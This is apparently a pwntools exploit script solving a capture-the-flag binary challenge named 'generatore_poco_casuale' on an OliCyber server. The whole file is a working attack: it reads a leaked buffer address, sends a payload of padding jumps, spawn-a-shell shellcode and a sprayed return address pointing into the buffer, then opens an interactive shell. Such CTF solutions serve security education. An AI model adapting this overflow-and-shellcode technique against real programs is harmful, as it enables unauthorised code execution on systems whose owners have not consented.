from pwn import *
import time
import ctypes

elf = context.binary = ELF('./generatore_poco_casuale')
libc = ctypes.CDLL('libc.so.6')
if args.REMOTE:
    p = remote('gpc.challs.olicyber.it', 10104)
elif args.GDB:
    p = gdb.debug(elf.path, gdbscript='''
        b *randomGenerator
        c
    ''')
else:
    p = elf.process()


context.arch = 'amd64'
p.recvuntil(b': ')
addr_buff = int(p.recvline().strip())

p.recvline()
## non 100% sicuro, solo se size > 56
shellcode = asm("""jae $+2
                jae $+2
                jae $+2
                jae $+2
                """)
print(len(shellcode))
payload = b's'+b'\0'*7 + shellcode + asm(shellcraft.sh()) +  b''.join([p64(addr_buff+8) for _ in range(124 * 8)])
p.sendline(payload)
p.interactive()